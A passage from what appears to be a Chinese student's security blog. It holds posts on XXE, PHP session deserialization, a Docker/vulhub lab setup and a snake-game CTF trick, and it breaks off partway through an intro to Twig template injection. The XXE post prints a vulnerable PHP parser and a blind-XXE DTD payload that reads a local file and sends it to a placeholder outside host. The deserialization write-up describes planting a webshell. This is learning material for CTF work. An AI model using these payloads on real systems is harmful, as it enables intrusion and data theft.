    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>

<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
<p>2.属性，与html几乎一样</p>
<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
<p>创建一个t.dtd文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
<p>正常显示</p>
<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
<p>2.%实体名;这个只能在dtd中使用</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
<p>　<strong>xml.php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>　<strong>test.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>

<p>　<strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<p>这里由于没有找到例题，直接抄合天的了</p>
<p>新学的linux命令</p>
<p>grep -i “GET” xxx.log</p>
<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
]]></content>
      <categories>
        <category>技术探索</category>
      </categories>
      <tags>
        <tag>xml</tag>
      </tags>
  </entry>
  <entry>
    <title>php_Session反序列化学习</title>
    <url>/2024/02/25/php-Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="php反序列化的一种"><a href="#php反序列化的一种" class="headerlink" title="php反序列化的一种"></a>php反序列化的一种</h1><span id="more"></span>

<h1 id="从开发者角度认识session"><a href="#从开发者角度认识session" class="headerlink" title="从开发者角度认识session"></a>从开发者角度认识session</h1><h2 id="为什么需要session"><a href="#为什么需要session" class="headerlink" title="为什么需要session"></a>为什么需要session</h2><p>由于http协议是无状态的，所以我们需要一种基于http的技术让服务器识别用户的状态，以达到防护，提供用户个性化资源，记录用户操作等目的</p>
<h1 id="session一些特性"><a href="#session一些特性" class="headerlink" title="session一些特性"></a>session一些特性</h1><p>相比于cookie，session主要由sessionid和它所带的值组成，而session存储在客户端和服务端两端，客户端只存储sessionid，服务端两个都存。</p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>如果我想通过session实现一个功能——当用户登录时，页面会显示”你好!xxx”</p>
<p>简单写个前后端</p>
<p>注册</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184635095.png"  alt="image-20240225184635095"></p>
<p>填入后可以看到在tem目录下的session文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184701936.png"  alt="image-20240225184701936"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225184712646.png"  alt="image-20240225184712646"></p>
<p>登录</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185914591.png"  alt="image-20240225185914591"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240225185932722.png"  alt="image-20240225185932722"></p>
<p>我们就实现了这个功能</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><p>前面提到用户的输入会以序列化的形式存储在session中，php给我们提供了三种处理引擎，由<code>session.serialize_handler</code>来设置</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152937389.png"  alt="image-20240226152937389"></p>
<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>存储格式:键名+竖线+经过<code>serialize()</code>函数序列化处理的值</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226152654358.png"  alt="image-20240226152654358"></p>
<p>这里竖线前面的user是<code>$_SESSION[&#39;user&#39;]</code>里的user，竖线后面的user是类名</p>
<h3 id="php-binary"><a href="#php-binary" class="headerlink" title="php_binary"></a>php_binary</h3><p>键名的长度对应的ASCII字符+键名+经过<code>serialize()</code>函数序列化处理的值</p>
<p>对比上面的php其实也就多个ASCII字符,少个竖线</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226153657091.png"  alt="image-20240226153657091"></p>
<p>为了更直观，我把键名写到33个字符，33对应的ASCII字符为!</p>
<h3 id="php-serialize"><a href="#php-serialize" class="headerlink" title="php_serialize"></a>php_serialize</h3><p>经过<code>serialize()</code>函数序列化处理的__数组__</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154036903.png"  alt="image-20240226154036903"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226154420821.png"  alt="image-20240226154420821"></p>
<p>a表示的是SESSION数组中有几个元素，花括号里包括序列化后的数据，这里的键名也需要<code>s::;</code>的表达</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>当两个文件所用的处理器不相同时，且SESSION数组内的值可控时，我们就可以构造恶意数据来进行操作</p>
<h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>我在注册这边使用的是php_binary处理器，登录那边用的是php处理器</p>
<p>注册这边它的用户名，和密码都是可控的，如果我们正常输入，它会这样存入</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226161914641.png"  alt="image-20240226161914641"></p>
<p>我们就可以在username的属性动一些手脚达到改属性的目的，这里把Ewoji改为了Emoji</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164258514.png"  alt="image-20240226164258514"></p>
<p>之后再打开登录文件</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226162151930.png"  alt="image-20240226162151930"></p>
<p>修改成功</p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>这里是由|产生了歧义，php处理器把|后面的东西当作对象反序列化了</p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="CTFSHOW-web-263"><a href="#CTFSHOW-web-263" class="headerlink" title="CTFSHOW web-263"></a>CTFSHOW web-263</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240226164651595.png"  alt="image-20240226164651595"></p>
<p>题面，看源码，抓包无果，直接开扫</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226164731869.png"  alt="image-20240226164731869"></p>
<p><a class="link"   href="http://www.zip,下载,打开/" >www.zip,下载，打开<i class="fas fa-external-link-alt"></i></a></p>
<p>发现漏洞点</p>
<p>1.写入SESSION:原本用来记录limit的值可以修改</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185421699.png"  alt="image-20240226185421699"></p>
<p>2.写入文件:<code>file_put_contents()</code>,这里的意思是用用户输入的username为一个log-xxx的日志文件命名，写入的内容password可以用反序列修改，这就可以直接写马</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185527715.png"  alt="image-20240226185527715"></p>
<p>3.触发反序列化，这里的&#x2F;inc&#x2F;inc.php是不可访问的，但是check.php没有禁止访问而且它包含了inc.php，访问check.php即可触发反序列化</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185757295.png"  alt="image-20240226185757295"></p>
<p>最后的payload如下 :</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185841358.png"  alt="image-20240226185841358"></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240226185855523.png"  alt="image-20240226185855523"></p>
<p>然后连接读取flag即可</p>
]]></content>
      <categories>
        <category>技术探索</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>使用kali-linux和docker搭建漏洞复现平台日记</title>
    <url>/2024/03/11/%E4%BD%BF%E7%94%A8kali-linux%E5%92%8Cdocker%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%B9%B3%E5%8F%B0%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"><a href="#其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧" class="headerlink" title="其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧"></a>其实早就想弄这个了，老是忘了，这次队长布置了任务就做了吧</h3><span id="more"></span>

<h1 id="kali-linux优化"><a href="#kali-linux优化" class="headerlink" title="kali-linux优化"></a>kali-linux优化</h1><p>刚刚开始下的时候可卡了，输入老是有延迟，用的很不爽</p>
<h2 id="掉帧问题"><a href="#掉帧问题" class="headerlink" title="掉帧问题"></a>掉帧问题</h2><p><a class="link"   href="https://zhuanlan.zhihu.com/p/265868395" >解决VMware运行卡顿的问题 - 知乎 (zhihu.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>亲测有效</p>
<h2 id="num-lock问题"><a href="#num-lock问题" class="headerlink" title="num lock问题"></a>num lock问题</h2><p>鼠标在虚拟机和主机切换的时候老是跳</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240311225635342.png"  alt="image-20240311225635342"></p>
<p>其实是因为主机和虚拟机的lock状态不同，摁数字上面的那个num跳成一致即可</p>
<h1 id="下载docker和vulhub"><a href="#下载docker和vulhub" class="headerlink" title="下载docker和vulhub"></a>下载docker和vulhub</h1><p>sudo apt-get install docker.io</p>
<p>sudo apt-get install python3-pip</p>
<p>sudo apt-get install docker-compose</p>
<p>git clone <a class="link"   href="https://github.com/vulhub/vulhub.git" >https://github.com/vulhub/vulhub.git<i class="fas fa-external-link-alt"></i></a></p>
<p>这里出现了好多报错，耐心排查，收集资料</p>
<h1 id="docker一些小知识"><a href="#docker一些小知识" class="headerlink" title="docker一些小知识"></a>docker一些小知识</h1><p>这里有几个概念，仓库，tar包，dockerfile，容器</p>
<p>我们要记住这四个东西都是为一个东西——镜像服务的即可</p>
<p>镜像是什么，镜像就是一个巨大的压缩文件，它可以把很多东西压缩在里面，比如一些系统环境啥的</p>
<h2 id="仓库"><a href="#仓库" class="headerlink" title="仓库"></a>仓库</h2><p>用来存储镜像的地方</p>
<p><code>docker pull</code>将镜像从仓库拉出来</p>
<p><code>docker push</code>将镜像推进仓库</p>
<h2 id="tar包"><a href="#tar包" class="headerlink" title="tar包"></a>tar包</h2><p>tar是镜像的压缩，通过指令可以解压和打包</p>
<p><code>docker save</code>把镜像打成tar包</p>
<p><code>docker load</code>把tar包解药为镜像</p>
<h2 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h2><p>由于dockerfile的语法我不是很懂</p>
<p>这里只知道dockerfile可以在编辑后通过<code>docker build</code>建成一个镜像文件</p>
<h2 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h2><p>容器就是容纳镜像解压出来后的所有东西，它容下了所有的配置，代码啥的</p>
<p>我们就可以直接访问这个容器得到所得的服务</p>
<p><code>docker run -dit -p 100:80 --name ewoji</code>启动容器–参数-d表示在后台运行，-p表示端口映射如100:80（前是宿主机的端口后是docker容器的端口）–name 给你的容器取名 -t开个可互动的bash -i标准输出回本机</p>
<p><code>docker commit</code>容器在改动后还可以再压缩回镜像</p>
<p><code>docker exec -it yourname bash </code>进入容器的终端进行控制 exit退出 </p>
<p><code>docker ps</code>查看已经开启的容器的信息</p>
<h2 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h2><p>docker-compose就是掌管多个容器相互通信的东西</p>
<p>多个容器通过一张docker网卡来实现ip地址的分配，容器之间可以直接curl+ip来获取另一容器的数据，本地则通过网卡路由来与容器交换信息（一般在创建容器的时候要分配好域名，不然又要到容器上看host文件）</p>
<p><code>docker run -dit --link ewoji:ewoji --name eowji</code>把另一个容器ewoji映射到本容器，其实就是修改host文件</p>
<p>之后就直接curl ewoji就好了</p>
<p>既然这样那还用docker-compose干嘛呢，试想如果有三个容器，一个nginx，一个php，一个mysql，用户通过80端口使用NGINX服务，那么Nginx容器必然要用link链接php，而php又要链接mysql，而且创建容器的顺序还必须先从mysql开始，不然php就无法配置链接</p>
<p>那么有没有一种可能，就是我们把配置文件统一掌管，可以实时修改呢，那就是docker-compose</p>
<p>等于一个统一部署吧</p>
<h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240312181044240.png"  alt="image-20240312181044240"></p>
<p>可见这里做了配置文件和根目录的映射</p>
<p><code>docker-compose up -d</code>这样就开始拉取镜像了 </p>
<h1 id="使用vulhub中的靶场"><a href="#使用vulhub中的靶场" class="headerlink" title="使用vulhub中的靶场"></a>使用vulhub中的靶场</h1><p>ls vulhub</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312174132393.png"  alt="image-20240312174132393"></p>
<p>这里有很多，选个认识的<code>cd vulhub/weblogic/CVE-2018-2894</code>,<code>docker run -d up</code>这里实际上就是集成了<code>docker run</code>和<code>docker-compose up -d</code></p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312181853731.png"  alt="image-20240312181853731"></p>
<p>看到已经启动了，再访问本地ip和你映射的端口即可</p>
<p><code>docker stop &lt;id or name&gt;</code>关闭容器</p>
<p><code>docker rm &lt;id or name&gt;</code>删除容器，记得先关闭再删除</p>
<h1 id="使用本地的镜像文件搭建靶场"><a href="#使用本地的镜像文件搭建靶场" class="headerlink" title="使用本地的镜像文件搭建靶场"></a>使用本地的镜像文件搭建靶场</h1><p>下载好的五题</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195458969.png"  alt="image-20240312195458969"></p>
<p>进入哪个rd都可以，看见里面有Dockerfile文件，在这里打开终端</p>
<p><code>docker build -t name .</code>特别注意后面的那个点代表当前目录</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312195639419.png"  alt="image-20240312195639419"></p>
<p>可以看见已经拉成镜像了</p>
<p>接着这里应该是没有弄docker-compose.yml吧那就两个直接run就好了</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240312205525422.png"  alt="image-20240312205525422"></p>
<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>如果要用宿主机来访问容器来进行抓包等操作的话，我们需要借助kali的虚拟网卡，只需在宿主机powershell加入一下命令即可</p>
<p>若不知道kali的虚拟网卡,ifconfig就可以查看</p>
<p>route add -P docker网段 mask 255.255.255.0 虚拟机IP</p>
]]></content>
      <categories>
        <category>技术探索</category>
      </categories>
      <tags>
        <tag>kali</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>记录一题好玩的游戏题</title>
    <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
    <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210350791.png"  alt="image-20240509210350791"></p>
<p>需要我们控制小蛇生存60s，玩玩看</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509205907%20(1).gif"  alt="QQ录屏20240509205907 (1)"></p>
<p>玩个蛋，给他60s估计都能飞上月球了</p>
<p>我们打开控制台看源码</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509210928331.png"  alt="image-20240509210928331"></p>
<h1 id="高效解法"><a href="#高效解法" class="headerlink" title="高效解法"></a>高效解法</h1><p>可以看到一切都是从new一个snake开始的，注意到timeCounter计时器，于是我们在控制台new一个新的snake再修改计时器时间即可</p>
<p><img   src="/../img/$%7Bfiilename%7D/image-20240509211124591.png"  alt="image-20240509211124591"></p>
<p>成功出现flag</p>
<h1 id="搞笑解法"><a href="#搞笑解法" class="headerlink" title="搞笑解法"></a>搞笑解法</h1><h2 id="修改地图大小"><a href="#修改地图大小" class="headerlink" title="修改地图大小"></a>修改地图大小</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240509211716297.png"  alt="image-20240509211716297"></p>
<p>看看效果</p>
<p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509211757.gif"  alt="QQ录屏20240509211757"></p>
<p>可以看到撞墙了没有死，说明地图确实大了，然后咱们等他跑个60s就好</p>
<h2 id="改变小蛇速度"><a href="#改变小蛇速度" class="headerlink" title="改变小蛇速度"></a>改变小蛇速度</h2><p><img   src="/../img/$%7Bfiilename%7D/QQ%E5%BD%95%E5%B1%8F20240509213044.gif"  alt="QQ录屏20240509213044"></p>
<p>因为小蛇速度会加快，那么我们就设置一个定时任务，每0.5秒重新设置一次速度就好了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ewoji = <span class="keyword">new</span> <span class="title class_">Snake</span>(<span class="string">&#x27;ewoji&#x27;</span>,<span class="number">1.5</span>,<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">  ewoji.<span class="property">speed</span> = <span class="number">1.5</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> intervalID = <span class="built_in">setInterval</span>(myFunction, <span class="number">500</span>);</span><br></pre></td></tr></table></figure>

<p>或者干脆直接把speed设置为0，这样小蛇就会像bot一样在原地不动了</p>
<p>嘻嘻</p>
]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>Twig模板注入</title>
    <url>/2024/08/29/Twig%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h4 id="PHP常用的一种模板引擎引发的安全问题"><a href="#PHP常用的一种模板引擎引发的安全问题" class="headerlink" title="PHP常用的一种模板引擎引发的安全问题"></a>PHP常用的一种模板引擎引发的安全问题</h4><span id="more"></span>

<p><a class="link"   href="https://twig.symfony.com/doc/" >Documentation - Twig - The flexible, fast, and secure PHP template engine (symfony.com)<i class="fas fa-external-link-alt"></i></a></p>
<p>最好能读读源文档吧，都是第一手没有经过传递的知识</p>
<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>和大多数引擎一样的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; person.name &#125;&#125;</span><br><span class="line">&#123;&#123; person[&#x27;name&#x27;] &#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;% set name = &#x27;ewoji&#x27; %&#125;&#125;</span><br><span class="line">&#123;&#123;% set num = [1,2] %&#125;&#125;</span><br><span class="line">&#123;&#123;% set person = &#123;&#x27;name&#x27;:&#x27;ewoji&#x27;&#125; %&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Filters"><a href="#Filters" class="headerlink" title="Filters"></a>Filters</h2><p>用于变量的过滤</p>
<p>格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123; variable|Filter &#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="eg"><a href="#eg" class="headerlink" title="eg"></a>eg</h3><h4 id="upper"><a href="#upper" class="headerlink" title="upper"></a>upper</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>([</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;&#123;&#123; name|upper &#125;&#125;!&#x27;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; <span class="string">&#x27;i am ewoJi&#x27;</span>] );</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240829105923091.png"  alt="image-20240829105923091"></p>
<h4 id="join"><a href="#join" class="headerlink" title="join"></a>join</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="keyword">__DIR__</span>.<span class="string">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$loader</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Loader\ArrayLoader</span>([</span><br><span class="line">    <span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;&#123;&#123; name|join &#125;&#125;---&#123;&#123;name|join(&quot;,&quot;)&#125;&#125;---&#123;&#123;name|join(&quot;,&quot;,&quot; and &quot;)&#125;&#125;&#x27;</span></span><br><span class="line">]);</span><br><span class="line"><span class="variable">$twig</span> = <span class="keyword">new</span> <span class="title class_">\Twig\Environment</span>(<span class="variable">$loader</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&#x27;index&#x27;</span>, [<span class="string">&#x27;name&#x27;</span> =&gt; [<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;j&#x27;</span>.<span class="string">&#x27;i&#x27;</span>]] );</span><br></pre></td></tr></table></figure>

<p><img   src="/../img/$%7Bfiilename%7D/image-20240829110834590.png"  alt="image-20240829110834590"></p>
<h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>还是看英文感觉能意会到，翻成中文就感觉怪怪的且绕口</p>
<p>The <code>map</code> filter applies an arrow function to the elements of a sequence or a mapping. The arrow function receives the value of the sequence or mapping:</p>
